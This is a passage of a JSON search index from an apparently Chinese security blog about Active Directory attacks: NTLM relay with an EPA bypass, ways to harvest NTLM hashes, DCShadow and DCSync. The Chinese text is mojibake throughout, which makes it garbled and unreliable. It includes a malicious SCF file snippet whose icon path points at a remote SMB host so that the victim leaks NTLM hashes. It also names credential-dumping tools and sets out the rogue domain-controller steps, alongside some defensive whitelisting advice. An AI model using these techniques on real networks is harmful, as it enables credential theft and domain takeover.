åœ¨å®é™…çš„æŠ¥æ–‡ä¸­è§ä¸‹å›¾ï¼Œè¿™æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯å‘é€çš„è®¤è¯æŠ¥æ–‡ã€‚ å¦‚æœæˆ‘ä»¬åœ¨æœåŠ¡å™¨å‘é€æŒ‘æˆ˜ä¿¡æ¯åˆ°å®¢æˆ·ç«¯æ—¶ï¼Œåœ¨æŒ‘æˆ˜æŠ¥æ–‡ä¸»åŠ¨ä¸­æ·»åŠ ä¸€ä¸ª Channel Bindings åˆ°æ¶ˆæ¯å—ä¸­ï¼Œç±»ä¼¼äºä¸‹å›¾æ‰€ç¤ºï¼Œæ³¨æ„ä¸‹å›¾æ˜¯æœåŠ¡å™¨å‘é€çš„æŒ‘æˆ˜æŠ¥æ–‡ï¼Œç”±äº Channel Bindings æ˜¯ä¸€æ®µ MD5Hash å€¼ï¼Œæ˜¯æ¯”è¾ƒå¥½æ·»åŠ çš„ã€‚ å®¢æˆ·ç«¯æ”¶åˆ°æŒ‘æˆ˜ä¿¡æ¯åï¼Œä¼šå°†æˆ‘ä»¬äº‹å…ˆæ·»åŠ çš„ Channel Bindings ï¼Œå¹¶ä¸”å†æ¬¡è®¡ç®—ä¸€ä¸ªæ–°çš„ Channel Bindings æ·»åŠ åˆ°è®¤è¯æŠ¥æ–‡åé¢ï¼Œå¯¼è‡´è®¤è¯æŠ¥æ–‡åŒ…å« 2 ä¸ª Channel Bindingsï¼Œè§ä¸‹å›¾ï¼Œæ³¨æ„è¿™æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯å‘é€çš„è®¤è¯æŠ¥æ–‡ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒåŸŸæœåŠ¡å™¨ä¼šé€‰æ‹©ç¬¬ä¸€ä¸ª ChannelBindings è¿›è¡Œæ ¡éªŒï¼Œå¿½ç•¥ç¬¬äºŒä¸ª Channel Bindingsï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è§„é¿ EPA çš„ä¿æŠ¤ï¼Œå®ç°æ”»å‡»ç›®çš„ã€‚ å¦‚æœå®¢æˆ·ç«¯å¼€å¯äº†MICä¿æŠ¤ï¼Œåˆ™å’Œå‰é¢ä¸€æ ·ï¼Œç›´æ¥ä¸¢å¼ƒ MIC å‚è€ƒï¼š https://cloud.tencent.com/developer/article/1645398 https://en.hackndo.com/ntlm-relay/#authentication-signing-mic ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:5:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è·å– NTLM","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"è·å– NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è·å– NTLM ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"è·å– NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 ç›¸å…³èƒŒæ™¯ ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"è·å– NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.1 NTLM çš„å­˜å‚¨ä½ç½®: 1ã€ç³»ç»Ÿæ•°æ®åº“ SAM (Security Account Manager) 2ã€DIT æ•°æ®åº“ 3ã€å†…å­˜ Cache ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"è·å– NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.2 NTLM çš„è·å–æ–¹å¼ 1ã€ä» SAM è·å– 2ã€å†…å­˜è·å– 3ã€DIT æ•°æ®åº“è·å– 4ã€WCEã€PWDUMPã€MIMIKATZâ€¦ ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"è·å– NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.3 NTLM çš„å½¢å¼ aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 LMHash (windows 2008 R2ç³»ç»Ÿä»¥åç³»ç»Ÿé»˜è®¤ä¸ä¿å­˜ LMHash) NTHash NetHash - ä¸»è¦è·å–è¯¥ç§ hash ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"è·å– NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.4 è¿œç¨‹è·å–æ–¹å¼(çªƒå–): 1ã€Responder 2ã€HTTP + SMB 3ã€SCF + SMB 4ã€SQL + SMB ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"è·å– NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ADV 170014 NTLM SSO 2017 å¹´ 10 æœˆï¼Œå¾®è½¯åœ¨å‘¨äºŒè¡¥ä¸æ—¥å…¬å¸ƒäº†ä¸€ä»½å®‰å…¨å…¬å‘Š(ADV170014)ï¼Œè¿™ä»½å®‰å…¨å…¬å‘Šä¸­æåˆ°äº† NTLM èº«ä»½éªŒè¯æ–¹æ¡ˆä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ¶æ„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥çªƒå–å“ˆå¸Œã€‚ æ”»å‡»è€…åªéœ€è¦å°†ä¸€ä¸ªæ¶æ„çš„ SCF æ–‡ä»¶æ”¾ç½®åœ¨å¯å…¬å¼€è®¿é—®çš„ Windows æ–‡ä»¶å¤¹ä¸­å³å¯ã€‚ ä¸€æ—¦æ–‡ä»¶è¢«æ”¾åœ¨æ–‡ä»¶å¤¹ä¸­ï¼Œå°±ä¼šè¢«ä¸€ä¸ªç¥ç§˜çš„ bug æ‰§è¡Œã€‚å®ƒä¼šæ”¶é›†ç›®æ ‡çš„ NTLM å¯†ç æ•£åˆ—ï¼Œå¹¶å°†å…¶å‘é€åˆ°ä¸€ä¸ªé…ç½®æœåŠ¡å™¨ä¸­ã€‚ ç›®æ ‡ä¸»æœºå­˜åœ¨æ²¡æœ‰è®¾ç½®å¯†ç ä¿æŠ¤çš„ä¸€ä¸ªå…±äº«æ–‡ä»¶å¤¹ï¼Œè¿™ç§åœºæ™¯éå¸¸å¸¸è§ï¼Œæ¯”å¦‚åŠå…¬å®¤ã€å­¦æ ¡ã€åŒ»é™¢ä»¥åŠå¤§å¤šæ•° Windows ç¯å¢ƒä¸­ï¼Œäººä»¬éƒ½ä¼šé€šè¿‡å…±äº«æ–‡ä»¶å¤¹æ¥å…±äº«éŸ³ä¹ã€ç…§ç‰‡ä»¥åŠæ–‡æ¡£ã€‚ ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"è·å– NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ”»å‡»åœºæ™¯ éæ­£ç‰ˆç³»ç»Ÿå¯èƒ½æ²¡æœ‰è¯¥è®¾ç½®ï¼š å¾®è½¯åœ¨ Windows 3.11 æ—¶å¼•å…¥äº† SCF æ–‡ä»¶ã€‚SCFæ–‡ä»¶å…¶å®æ˜¯çº¯æ–‡æœ¬æ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æŒ‡å¯¼ Windows æ–‡ä»¶èµ„æºç®¡ç†å™¨æ‰§è¡Œä¸€äº›åŸºæœ¬ä»»åŠ¡ã€‚ [Shell] Command=2 IconFile=\\\\192.168.1.2\\sharetest.ico [Taskbar] Command=ToggleDesktop ","date":"2020-05-09","objectID":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/:1:6","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"è·å– NTLM","uri":"/2020/05/%E8%8E%B7%E5%8F%96-ntlm/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"DCShadow æ”»å‡»","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCShadow æ”»å‡»","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"DCShadow æ”»å‡» 2018 å¹´ 1 æœˆ 24 æ—¥ï¼ŒBenjamin Delpy(ç¥å™¨ Mimikatz çš„ä½œè€…)å’Œ Vincent Le Toux åœ¨ BlueHat IL ä¼šè®®æœŸé—´å…¬å¸ƒäº†é’ˆå¯¹åŸŸæ´»åŠ¨ç›®å½•çš„ä¸€ç§æ–°å‹æ”»å‡»æŠ€æœ¯ DCShadow åœ¨å…·å¤‡åŸŸç®¡ç†å‘˜æƒé™æ¡ä»¶ä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¼ªé€ çš„åŸŸæ§åˆ¶å™¨ï¼Œå°†é¢„å…ˆè®¾å®šçš„å¯¹è±¡æˆ–å¯¹è±¡å±æ€§å¤åˆ¶åˆ°æ­£åœ¨è¿è¡ŒåŸŸæœåŠ¡å™¨ä¸­ DCSync ä»åŸŸæœåŠ¡å™¨å¤åˆ¶å‡ºä¸œè¥¿ï¼ŒDCShadow æ˜¯å°†æ•°æ®å¤åˆ¶è‡³åŸŸæœåŠ¡å™¨ Luc Delsalle å¯¹è¿™ç§æŠ€æœ¯è¿›è¡Œäº†éªŒè¯å’Œè¯¦ç»†çš„æè¿°ï¼Œå¹¶å°±çº¢è“å¯¹æŠ—ä¸­è“é˜Ÿå¯¹æŠ—æ­¤ç§æ”»å‡»æŠ€æœ¯çš„ç¼ºé™·å’Œè¡¥æ•‘æ–¹æ³•ã€‚ ä» DCShadow ç›®å‰å±•ç¤ºçš„åŠŸèƒ½æ¥çœ‹ï¼Œä¸»è¦åªèƒ½ç”¨äºçº¢è“å¯¹æŠ—çš„éšè”½åé—¨ã€‚ä½†æ˜¯ DCShadow ç¬¬ä¸€æ¬¡æ¾„æ¸…å’Œå®ç°äº†ä¼ªé€ ä¸€ä¸ª DC çš„æœ€å°éœ€æ±‚åˆé›†ï¼Œè¿™ä¸ªè´¡çŒ®éå¸¸å¤§ã€‚ä»¥ å‰å¾ˆå¤šæ”»å‡»æ–¹æ³•éƒ½å¡åœ¨ä¸èƒ½ä¼ªé€ åŸŸæœåŠ¡å™¨ï¼Œä¾‹å¦‚ MS15-011 å’Œ MS15-014 ç­‰ï¼Œæœ‰äº† DCShadow çš„åŸºç¡€ï¼Œç›¸ä¿¡å°†æ¥ä¼šæœ‰å¾ˆå¤šæ–°çš„æ”»å‡»æ–¹æ³•ã€‚ ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCShadow æ”»å‡»","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æµç¨‹ æ ¹æ® Luc Delsalle çš„æè¿°ï¼ŒDCShadow çš„æ”»å‡»è¿‡ç¨‹åŒ…æ‹¬ 3 ä¸ªä¸»è¦ä¸ªæ­¥éª¤: 1ã€åœ¨ç›®æ ‡åŸŸçš„ AD æ´»åŠ¨ç›®å½•æ³¨å†Œä¸€ä¸ªä¼ªé€ çš„ DC ä¸­; 2ã€ä½¿ä¼ªé€ çš„ DC è¢«å…¶ä»–çš„ DC è®¤å¯ï¼Œèƒ½å¤Ÿå‚ä¸åŸŸå¤åˆ¶ ; 3ã€å¼ºåˆ¶è§¦å‘åŸŸå¤åˆ¶ï¼Œå°†æŒ‡å®šçš„æ–°å¯¹è±¡æˆ–ä¿®æ”¹åçš„å¯¹è±¡å±æ€§åŒæ­¥å¤åˆ¶åˆ°å…¶ä»– DC ä¸­; ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCShadow æ”»å‡»","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ³¨å†Œä¼ªé€ çš„ DC ä¸€å°æœºå™¨è¦æƒ³æ³¨å†Œæˆä¸ºåŸŸä¸­çš„ä¸€å° DC æœåŠ¡å™¨ï¼Œéœ€è¦åœ¨åŸŸçš„æ´»åŠ¨ç›®å½•ä¸­æ³¨å†Œä¸€ä¸ª NTDS-DSA(nTDSDSA)ç±»å¯¹è±¡ã€‚æ³¨å†Œçš„ä½ç½®ä¸º CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com adsec.com åŸŸæœ‰ 3 å°åŸŸæœåŠ¡å™¨ï¼Œåˆ†åˆ«æ˜¯ LABDC01ã€RESDC01 åŠ WIN2016-DC01ï¼Œæ ‡çº¢çš„æ­£æ˜¯æˆ‘ä»¬å®éªŒç¯å¢ƒçš„åŸŸæœåŠ¡å™¨ã€‚æˆ‘ä»¬æµ‹è¯•çš„æœºå™¨ä¸º Win7X86cn04ï¼Œæµ‹è¯•æˆåŠŸçš„åˆ™ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„NTDS-DSA(nTDSDSA)ç±»å¯¹è±¡ æŸ¥çœ‹ CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=comçš„å®‰å…¨æè¿°ç¬¦ï¼Œå¯çŸ¥å¿…é¡»æœ‰åŸŸç®¡ç†å‘˜æƒé™æ‰å…·å¤‡å†™æƒé™ æ‰€ä»¥å‘åŠ¨ DCShadow æ”»å‡»é¦–å…ˆå¿…é¡»å…·å¤‡åŸŸç®¡ç†å‘˜æƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šå®éªŒï¼Œåšç‚¹æ‰‹è„šï¼Œå°±ä¼šå¥½åŠä¸€äº›ï¼Œä¾‹å¦‚å°†å®Œå…¨æƒé™èµ‹äºˆæ™®é€šç”¨æˆ·ï¼Œåˆ™æ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥ä¿®æ”¹ DC Shadow æºç ï¼š ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCShadow æ”»å‡»","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ³¨å†Œçš„ DC è¢«å…¶ä»– DC è®¤å¯ï¼Œèƒ½å¤Ÿå‚ä¸åŸŸå¤åˆ¶ ä¸€ä¸ªåˆšæ³¨å†Œçš„ DC è¦æƒ³è¢«åŸŸä¸­å…¶ä»–DCè®¤å¯ï¼Œèƒ½å¤Ÿå‚ä¸åŸŸå¤åˆ¶ï¼Œéœ€è¦æ»¡è¶³ 3 ä¸ªæ¡ä»¶: 1ã€è¿™å°ä¼ªé€  DC å…·å¤‡è®¤è¯å‡­è¯ï¼Œèƒ½è®¤è¯åˆ°åŸŸï¼Œå³æœ‰åŸŸå†…è´¦å·ï¼Œå¯ä»¥ä½¿ç”¨æœºå™¨è´¦å·ï¼Œå®éªŒç¯å¢ƒä¸­ä¸º WIN7X86CN04$; 2ã€ä¼ªé€  DC èƒ½è®¤è¯å…¶ä»– DC æ¥è®¿é—®çš„è´¦å·ï¼Œå¦‚æœæˆ‘ä»¬ç»™ WIN7X86CN04$ æ·»åŠ  SPNï¼Œåˆ™å¯ä»¥å®ç°è¿™ä¸€ç‚¹ã€‚å…³é”®æ˜¯éœ€è¦æ·»åŠ å“ªäº›SPNï¼ŒDCShadow çš„ä¸€ä¸ªå¤§è´¡çŒ®æ˜¯æ‰¾åˆ° äº† SPN çš„æœ€å°åˆé›†ï¼Œåªéœ€è¦ 2 ä¸ªå³å¯:DRSæœåŠ¡(GUID ä¸º E3514235â€“4B06â€“11D1-AB04â€“00C04FC2DCD2) å’Œ GS(Global Catalog)æœåŠ¡ 3ã€è¿è¡Œ DRS æœåŠ¡ï¼Œæœ€å°‘éœ€è¦å®ç° IDL_DRSBindã€IDL_DRSUnbindã€IDL_DRSGetNCChangesã€IDL_DRSUpdateRefs è¿™ 4 ä¸ª RPC æ¥å£ï¼Œä»¥ä¾¿å…¶ä»– DC èƒ½å¤Ÿé€šè¿‡ RPC è·å–éœ€è¦å¤åˆ¶çš„æ•°æ®ã€‚Mimikatz å·¥å…·çš„æœ€æ–°ç‰ˆå·²ç»é›†æˆäº†è¿™ 4 ä¸ªæ¥å£ ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCShadow æ”»å‡»","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¼ºåˆ¶ç«‹å³å‘èµ·åŸŸå¤åˆ¶ é€šå¸¸è´Ÿè´£åŸŸå¤åˆ¶å’ŒåŒæ­¥çš„è¿›ç¨‹æ˜¯ KCC è¿›ç¨‹ï¼Œé»˜è®¤æ—¶é—´æ˜¯ 15 åˆ†é’Ÿæ ¡éªŒä¸€æ¬¡ï¼Œå¦‚æœéœ€è¦å¤åˆ¶åˆ™å‘èµ·;ä¹Ÿå¯ä»¥ä½¿ç”¨ Windows åŸŸæœåŠ¡å™¨è‡ªå¸¦çš„ç³»ç»Ÿå·¥å…· repadminï¼Œè¯¥å·¥å…·ä¼šè°ƒç”¨ DRSReplicaAdd å‡½æ•°æ¥å£å¼ºåˆ¶ç«‹å³å‘èµ·åŸŸå¤åˆ¶ï¼ŒDCShadow æ­£æ˜¯é€šè¿‡è°ƒç”¨ DRSReplicaAdd å‡½æ•°å¼ºåˆ¶ç«‹å³å‘èµ·åŸŸå¤åˆ¶ ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCShadow æ”»å‡»","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ”»å‡»å¤ç° æŸ¥çœ‹ CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=adsec,DC=com çš„å®‰å…¨æè¿°ç¬¦ï¼Œå¯çŸ¥å¿…é¡»æœ‰åŸŸç®¡ç†å‘˜æƒé™æ‰å…·å¤‡å†™æƒé™ æ‰€ä»¥å‘åŠ¨ DCShadow æ”»å‡»é¦–å…ˆå¿…é¡»å…·å¤‡åŸŸç®¡ç†å‘˜æƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šå®éªŒï¼Œåšç‚¹æ‰‹è„šï¼Œå°±ä¼šå¥½åŠä¸€äº›ï¼Œä¾‹å¦‚å°†å®Œå…¨æƒé™èµ‹äºˆæ™®é€šç”¨æˆ·ï¼Œåˆ™æ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥ä¿®æ”¹ æ”»å‡»æ—¶æ³¨æ„é˜²ç«å¢™çš„è®¾ç½® ","date":"2020-05-07","objectID":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCShadow æ”»å‡»","uri":"/2020/05/dcshadow-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"DCSync æ”»å‡»","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCSync æ”»å‡»","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"DCSync æ”»å‡» 2015 å¹´ 8 æœˆï¼ŒBenjamin Delpy(ç¥å™¨ Mimikatz çš„ä½œè€…)å’Œ Vincent Le Toux å‘å¸ƒäº†æ–°ç‰ˆæœ¬çš„ Mimikatzï¼Œæ–°å¢åŠ äº† DCSync åŠŸèƒ½ã€‚æ¨¡ä»¿ä¸€ä¸ªåŸŸæ§åˆ¶å™¨ DCï¼Œä»çœŸå®çš„åŸŸæ§åˆ¶å™¨ä¸­è¯·æ±‚è·å–æ•°æ®ï¼Œä¾‹å¦‚è´¦å·çš„å£ä»¤æ•£åˆ—å€¼ç­‰æ•°æ®ã€‚ DCSync ä¹‹å‰ï¼Œè·å–åŸŸçš„è´¦å·å£ä»¤ä¿¡æ¯ï¼Œéœ€è¦ç™»å½•åŸŸæœåŠ¡å™¨ï¼Œåœ¨åŸŸæœåŠ¡å™¨ä¸Šè¿è¡Œä»£ç æ‰å¯ä»¥è·å–ã€‚ DCSync çš„æœ€å¤§ç‰¹ç‚¹ï¼Œåœ¨äºä¸ç”¨ç™»å½•åŸŸæœåŠ¡å™¨ï¼Œå³å¯è¿œç¨‹é€šè¿‡åŸŸæ•°æ®åŒæ­¥å¤åˆ¶çš„æ–¹å¼è·å¾—æƒ³è¦çš„ç”¨æˆ·å£ä»¤ä¿¡æ¯ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒDCSync æ”»å‡»çš„å¯¹è±¡å¦‚æœæ˜¯ RODC åŸŸæ§åˆ¶å™¨ï¼Œåˆ™ä¼šå¤±æ•ˆï¼Œå› ä¸º RODC æ˜¯ä¸èƒ½å‚ä¸å¤åˆ¶åŒæ­¥æ•°æ® ","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCSync æ”»å‡»","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸç† DCSync çš„åŸç†éå¸¸æ¸…æ™°ï¼Œåˆ©ç”¨åŸŸæ§åˆ¶å™¨ä¹‹é—´çš„æ•°æ®åŒæ­¥å¤åˆ¶ã€‚ å‘ç°ç½‘ç»œä¸­çš„ç›®æ ‡åŸŸæ§åˆ¶å™¨; é€šè¿‡ DRS æœåŠ¡çš„ GetNCChanges æ¥å£å‘èµ·æ•°æ®åŒæ­¥è¯·æ±‚ï¼ŒDirectory Replication Service (DRS) Remote Protocol Samba wiki å…³äº GetNCChanges çš„æè¿°åŒ…æ‹¬: å½“ä¸€ä¸ª DC (æˆä¸ºå®¢æˆ·ç«¯ DC)æƒ³ä»å…¶ä»– DC (æˆä¸ºæœåŠ¡ç«¯ DC)è·å–æ•°æ®æ—¶ï¼Œå®¢æˆ·ç«¯ DC ä¼šå‘æœåŠ¡ç«¯ DC å‘èµ·ä¸€ä¸ª GetNCChanges è¯·æ±‚ã€‚å›åº”çš„æ•°æ®åŒ…æ‹¬éœ€è¦åŒæ­¥çš„æ•° æ®ã€‚ å¦‚æœéœ€è¦åŒæ­¥çš„æ•°æ®æ¯”è¾ƒå¤šï¼Œåˆ™ä¼šé‡å¤ä¸Šè¿°è¿‡ç¨‹ã€‚æ¯•ç«Ÿæ¯æ¬¡å›åº”çš„æ•°æ®æœ‰é™ã€‚ ","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCSync æ”»å‡»","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å‰æ ä¸€ä¸ªç”¨æˆ·æƒ³å‘èµ· DCSync æ”»å‡»ï¼Œå¿…é¡»å…·å¤‡ä»¥ä¸‹æƒé™: 1ã€Replicating Directory Changes (DS-Replication-Get-Changes) 2ã€Replicating Directory Changes All (DS-Replication-Get-Changes-All) 3ã€Replicating Directory Changes In Filtered Set å³ï¼šé»˜è®¤æƒ…å†µä¸‹åŸŸç®¡ç†å‘˜ç»„å…·æœ‰è¯¥æƒé™ã€‚ ","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCSync æ”»å‡»","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ”»å‡» ","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCSync æ”»å‡»","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"é˜²å¾¡ DCSync æ”»å‡»çš„åŸç†æ˜¯æ¨¡æ‹ŸåŸŸæ§åˆ¶å™¨å‘èµ·æœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®åŒæ­¥å¤åˆ¶ã€‚ æœ€å¥½çš„é˜²å¾¡æ–¹æ³•æ˜¯ç»™åŸŸæ§åˆ¶å™¨è®¾ç½®ç™½åå•ã€‚åœ¨åŸŸå†…ï¼ŒåŸŸæ§åˆ¶å™¨çš„æ•°é‡ã€IPåœ°å€ã€MAC åœ°å€æ˜¯éå¸¸æ˜ç¡®æ¸…æ™°çš„èµ„äº§ï¼Œå°†è¿™äº›èµ„äº§è®¾ç½®åœ¨å…è®¸åŒæ­¥çš„ç™½åå•å†…ã€‚éç™½åå•çš„ IP ä¸å…è®¸å‘ç”Ÿæ•°æ®åŒæ­¥ è·å–åŸŸå†…æ‰€æœ‰IPçš„è„šæœ¬: PowerShell:Get-ADDomainController -filter * | select IPv4Address æˆ– [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | select IPAddress åœ¨ç½‘ç»œè®¾å¤‡ä¸Šæ£€æµ‹æ¥è‡ªç™½åå•ä»¥å¤–çš„åŸŸæ§åˆ¶å™¨æ•°æ®åŒæ­¥å¤åˆ¶ ","date":"2020-05-07","objectID":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"DCSync æ”»å‡»","uri":"/2020/05/dcsync-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»åŸç†åŠå®éªŒ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡» ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 åŸŸå§”æ´¾ç›¸å…³å®šä¹‰ 